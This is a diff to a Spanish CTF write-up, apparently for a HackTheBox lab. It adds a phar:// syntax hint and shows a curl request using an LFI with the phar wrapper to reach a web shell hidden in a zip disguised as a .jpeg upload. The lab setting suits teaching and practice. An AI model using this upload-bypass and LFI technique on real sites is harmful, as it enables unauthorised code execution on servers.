@@ -152,7 +152,8 @@ shell.cucuxii: Zip archive data   # Aunque tenga la extension jpeg esto es un zi
 En /uploads aparece un nuevo directorio -> 1526e941f20f74050a82951a5bda79e2, ahi dentro está shell.jpeg  
 ![updown4](https://user-images.githubusercontent.com/96772264/215056204-2a60d2c2-4dab-41f3-9095-d4a337e0ae72.PNG)
 
-Si accedemos con phar por el lfi al archivo de dentro (shell.php que es shell porque concatena ello solo el .php)  
+Si accedemos con el wrapper phar:// con el LFI al archivo de dentro (shell.php que es shell porque concatena ello solo el .php)  
+> phar://ruta_del_archivo_madre/archivo_hijo   
 ```console
 └─$ curl -s -H "Special-Dev: only4dev" 'http://dev.siteisup.htb/?page=phar://uploads/1526e941f20f74050a82951a5bda79e2/shell.jpeg/shell' -I
 HTTP/1.0 500 Internal Server Error
